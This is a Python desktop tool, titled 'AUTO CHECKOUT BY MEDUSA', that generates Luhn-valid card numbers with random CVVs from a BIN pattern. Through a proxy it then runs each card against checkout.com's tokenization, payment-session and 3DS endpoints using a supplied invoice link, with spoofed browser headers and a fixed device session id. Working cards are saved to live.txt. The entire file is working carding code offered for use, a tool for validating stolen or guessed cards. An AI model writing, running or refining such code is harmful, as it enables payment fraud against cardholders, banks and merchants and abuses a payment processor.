import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from ttkbootstrap.dialogs import Messagebox
from tkinter.scrolledtext import ScrolledText
from tkinter import filedialog, simpledialog
from tkinter import IntVar
import threading
import requests
import re
import json
import os
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

def get_proxy_dict(proxy_str):
    host, port, user, pwd = proxy_str.strip().split(":")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}

def parse_card(line):
    parts = re.split(r'[\|:;,\s]+', line)
    if len(parts) < 4:
        raise ValueError("Invalid card format")
    mes1 = str(int(parts[1]))
    return {
        "cc": parts[0],
        "mes1": mes1,
        "ano": parts[2],
        "cvv": parts[3]
    }

def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def luhn_complete(bin_pattern):
    """Generate a valid card number from a bin pattern with x's using Luhn algorithm."""
    def luhn_resolve(number):
        digits = [int(d) for d in number]
        for i in range(len(digits)-2, -1, -2):
            doubled = digits[i] * 2
            digits[i] = doubled if doubled < 10 else doubled - 9
        return (10 - sum(digits) % 10) % 10

    incomplete = bin_pattern.replace('x', '0')
    base = incomplete[:-1]
    card = ''
    for i, c in enumerate(bin_pattern):
        if c.lower() == 'x':
            card += str(random.randint(0, 9))
        else:
            card += c
    # Replace last digit with correct Luhn check digit
    card = card[:-1] + str(luhn_resolve(card[:-1] + '0'))
    return card

def generate_cards(bin_pattern, count):
    cards = set()
    while len(cards) < count:
        card = luhn_complete(bin_pattern)
        cards.add(card)
    return list(cards)

class CheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("AUTO CHECKOUT BY MEDUSA")
        self.root.geometry("700x500")
        self.root.resizable(True, True)
        self.generated_cards = []
        self.stop_flag = threading.Event()
        self.setup_ui()

    def setup_ui(self):
        style = ttk.Style("darkly")  # Dark theme

        title = ttk.Label(self.root, text="💳 AUTO CHECKOUT BY MEDUSA 💳", font=("Segoe UI", 18, "bold"), bootstyle="inverse-dark")
        title.pack(pady=(18, 8))

        frame = ttk.Frame(self.root, padding=15, bootstyle="dark")
        frame.pack(fill=BOTH, expand=False, padx=20, pady=10)

        ttk.Label(frame, text="Proxy (host:port:user:pass):", font=("Segoe UI", 11), bootstyle="inverse-dark").grid(row=0, column=0, sticky=W, pady=6)
        self.proxy_entry = ttk.Entry(frame, width=45, font=("Segoe UI", 11))
        self.proxy_entry.grid(row=0, column=1, sticky=EW, pady=6, padx=5)

        self.start_btn = ttk.Button(self.root, text="🚀 Start Checking", bootstyle="success", width=20, command=self.start_checking)
        self.start_btn.pack(pady=18)

        self.log_box = ScrolledText(self.root, width=80, height=16, font=("Consolas", 11))
        self.log_box.pack(fill=BOTH, expand=True, padx=20, pady=(0, 10))
        self.log_box.config(state="disabled")

        # Set focus to proxy entry
        self.proxy_entry.focus()

        # Add Card Generator Frame
        gen_frame = ttk.Labelframe(self.root, text="Card Generator", bootstyle="dark")
        gen_frame.pack(fill=X, padx=20, pady=(0, 10))

        ttk.Label(gen_frame, text="BIN/Extrap (e.g. 414720271363xxxx):", bootstyle="inverse-dark").grid(row=0, column=0, padx=5, pady=5, sticky=W)
        self.bin_entry = ttk.Entry(gen_frame, width=22, font=("Segoe UI", 11))
        self.bin_entry.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(gen_frame, text="How many:", bootstyle="inverse-dark").grid(row=0, column=2, padx=5, pady=5, sticky=W)
        self.gen_count = IntVar(value=10)
        self.count_entry = ttk.Entry(gen_frame, width=6, textvariable=self.gen_count, font=("Segoe UI", 11))
        self.count_entry.grid(row=0, column=3, padx=5, pady=5)

        ttk.Label(gen_frame, text="Month:", bootstyle="inverse-dark").grid(row=0, column=4, padx=5, pady=5, sticky=W)
        self.exp_month = ttk.Combobox(gen_frame, width=4, font=("Segoe UI", 11), values=[f"{i:02d}" for i in range(1, 13)])
        self.exp_month.grid(row=0, column=5, padx=2, pady=5)

        ttk.Label(gen_frame, text="Year:", bootstyle="inverse-dark").grid(row=0, column=6, padx=5, pady=5, sticky=W)
        current_year = time.localtime().tm_year
        self.exp_year = ttk.Combobox(gen_frame, width=6, font=("Segoe UI", 11), values=[str(y) for y in range(current_year, current_year + 11)])
        self.exp_year.grid(row=0, column=7, padx=2, pady=5)

        ttk.Button(gen_frame, text="Generate", bootstyle="info", command=self.on_generate_cards).grid(row=0, column=8, padx=5, pady=5)

        self.generated_box = ScrolledText(gen_frame, width=60, height=5, font=("Consolas", 10))
        self.generated_box.grid(row=1, column=0, columnspan=9, padx=5, pady=5)
        # self.generated_box.config(state="disabled")  # <-- REMOVE or COMMENT THIS OUT

        # Add control buttons frame
        ctrl_frame = ttk.Frame(self.root)
        ctrl_frame.pack(pady=(0, 10))

        self.stop_btn = ttk.Button(ctrl_frame, text="🛑 Force Stop", bootstyle="danger", width=16, command=self.force_stop)
        self.stop_btn.grid(row=0, column=0, padx=8)

        self.clear_btn = ttk.Button(ctrl_frame, text="🧹 Clear Results", bootstyle="info", width=16, command=self.clear_results)
        self.clear_btn.grid(row=0, column=1, padx=8)

    def start_checking(self):
        proxy = self.proxy_entry.get().strip()
        if not proxy:
            Messagebox.show_error("Please enter a proxy.", "Input Error")
            return

        # Read cards from the box (user can paste or edit)
        card_text = self.generated_box.get("1.0", "end").strip()
        combos = [line for line in card_text.splitlines() if line.strip()]
        if not combos:
            Messagebox.show_error("Please generate or enter cards first.", "Input Error")
            return

        inv_url = simpledialog.askstring("INVOICE LINK", "Enter INVOICE LINK URL (from your config):", parent=self.root)
        if not inv_url:
            self.log("No INVOICE LINK provided.", "error")
            self.start_btn.config(state="normal")
            return

        self.start_btn.config(state="disabled")
        threading.Thread(target=self.run_checker, args=(proxy, combos, inv_url), daemon=True).start()

    def run_checker(self, proxy, combos, inv_url):
        proxies = get_proxy_dict(proxy)
        self.log_box.tag_config("good", foreground="#00ff99")
        self.log_box.tag_config("bad", foreground="#ff5555")
        self.log_box.tag_config("error", foreground="#ffcc00")

        headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        headers2 = {
            "origin": "https://checkout-web-components.checkout.com",
            "referer": "https://checkout-web-components.checkout.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "content-type": "application/json"
        }

        with ThreadPoolExecutor(max_workers=1) as executor:
            futures = []
            for line in combos:
                if self.stop_flag.is_set():
                    break
                futures.append(executor.submit(self.check_card, line, proxies, inv_url, headers1, headers2))
            for future in futures:
                future.result()  # Wait for all to finish

        self.stop_flag.clear()
        self.log("Done!", "good")
        self.start_btn.config(state="normal")

    def check_card(self, line, proxies, inv_url, headers1, headers2):
        if self.stop_flag.is_set():
            return
        try:
            self.log(f"[CHECKING] {line}")
            card = parse_card(line)
            aa = random_name(random.randint(7, 12))
            # 1. GET <INV>
            r1 = requests.get(inv_url, headers=headers1, proxies=proxies, timeout=30)
            sess = re.search(r'payment_session\\":{\\"id\\":\\"(.*?)\\",', r1.text)
            pk = re.search(r'"pk\\":\\"(.*?)\\",', r1.text)
            if not sess or not pk:
                self.log(f"[{line}] Failed to parse session or pk.", "error")
                return
            sess = sess.group(1)
            pk = pk.group(1)

            # 2. POST to /tokens
            payload2 = {
                "type": "card",
                "expiry_month": card["mes1"],
                "expiry_year": card["ano"],
                "number": card["cc"],
                "name": aa,
                "consumer_wallet": {}
            }
            # Make a fresh copy of headers2 for each thread/request
            local_headers2 = headers2.copy()
            r2 = requests.post("https://card-acquisition-gateway.checkout.com/tokens", headers=local_headers2, data=json.dumps(payload2), proxies=proxies, timeout=30)
            bin_match = re.search(r'bin":"(.*?)",', r2.text)
            tok_match = re.search(r'token":"(.*?)","', r2.text)
            if not bin_match or not tok_match:
                self.log(f"[DEBUG] /tokens response: {r2.text[:1000]}", "error")
                self.log(f"[{line}] Failed to parse bin or token.", "error")
                return
            bin_val = bin_match.group(1)
            tok = tok_match.group(1)

            # 3. POST to /payment-sessions/<sess>/submit
            url3 = f"https://api.checkout.com/payment-sessions/{sess}/submit"
            headers3 = headers2.copy()
            payload3 = {
                "type": "card",
                "card_metadata": {"bin": bin_val},
                "source": {"token": tok},
                "risk": {"device_session_id": "dsid_hjdic5huud7urgk3uhknuyi26u"},
                "session_metadata": {
                    "internal_platform": {"name": "CheckoutWebComponents", "version": "1.142.0"},
                    "feature_flags": [
                        "analytics_observability_enabled", "card_fields_enabled", "get_with_public_key_enabled",
                        "logs_observability_enabled", "risk_js_enabled", "use_edge_gateway_fastly_endpoint",
                        "use_non_bic_ideal_integration"
                    ],
                    "experiments": {}
                }
            }
            r3 = requests.post(url3, headers=headers3, data=json.dumps(payload3), proxies=proxies, timeout=30)

            if "payment_attempts_exceeded" in r3.text:
                self.log(f"[INVOICE VOIDED] {line}", "error")
                return

            if "declined" in r3.text.lower():
                self.log(f"[EMAIL OR IP BANNED] {line}", "error")
                return

            url_3ds = re.search(r'"url": "(.*?)"', r3.text)
            if not url_3ds:
                self.log(f"[EMAIL OR IP BANNED] {line}", "error")
                return
            url_3ds = url_3ds.group(1)

            # 4. GET <3ds>
            headers4 = {
                "origin": "https://checkout-web-components.checkout.com",
                "referer": url_3ds,
                "authorization": f"Bearer {pk}",
                "user-agent": headers2["user-agent"]
            }
            r4 = requests.get(url_3ds, headers=headers4, proxies=proxies, timeout=30)
            sid_match = re.search(r"sessionId: '([^']+)',", r4.text)
            if not sid_match:
                self.log(f"[{line}] Failed to parse sessionId.", "error")
                return
            sid = sid_match.group(1)
            # 6. GET 3ds status
            url6 = f"https://api.checkout.com/3ds/{sid}?M=h"
            headers6 = {
                "origin": "https://api.checkout.com",
                "referer": url6,
                "authorization": f"Bearer {pk}",
                "user-agent": headers2["user-agent"]
            }
            r6 = requests.get(url6, headers=headers6, proxies=proxies, timeout=120)
            if '"redirect_reason":"failure"' in r6.text:
                self.log(f"[DEAD] {line}", "bad")
            else:
                self.log(f"[LIVE] {line}", "good")
                with open("live.txt", "a") as f:
                    f.write(line + "\n")
        except Exception as e:
            self.log(f"[ERROR] {line} -> {e}", "error")

    def on_generate_cards(self):
        bin_pattern = self.bin_entry.get().strip()
        try:
            count = int(self.count_entry.get())
        except Exception:
            self.log("Invalid count for card generation.", "error")
            return
        if not bin_pattern or 'x' not in bin_pattern:
            self.log("Please enter a valid BIN/extrap with x's.", "error")
            return

        # Get selected month/year or random if blank
        month = self.exp_month.get()
        year = self.exp_year.get()

        cards = set()
        while len(cards) < count:
            card_number = luhn_complete(bin_pattern)
            # Use selected or random month/year
            m = month if month else f"{random.randint(1,12):02d}"
            y = year if year else str(random.randint(time.localtime().tm_year, time.localtime().tm_year + 5))
            cvv = f"{random.randint(0,999):03d}"
            cards.add(f"{card_number}|{m}|{y}|{cvv}")

        self.generated_box.config(state="normal")
        self.generated_box.delete("1.0", "end")
        for card in cards:
            self.generated_box.insert("end", card + "\n")

        #####self.generated_box.config(state="disabled")  # <-- Remove or comment this out
        self.generated_cards = list(cards)

    def log(self, msg, tag=None):
        self.log_box.config(state="normal")
        if tag == "good":
            self.log_box.insert("end", msg + "\n", "good")
        elif tag == "bad":
            self.log_box.insert("end", msg + "\n", "bad")
        elif tag == "error":
            self.log_box.insert("end", msg + "\n", "error")
        else:
            self.log_box.insert("end", msg + "\n")
        self.log_box.see("end")
        self.log_box.config(state="disabled")
        self.root.update()

    def force_stop(self):
        self.stop_flag.set()
        self.log("Force stop requested. Waiting for threads to finish...", "error")

    def clear_results(self):
        self.log_box.config(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.config(state="disabled")

if __name__ == "__main__":
    root = ttk.Window(themename="darkly")
    app = CheckerApp(root)
    root.mainloop()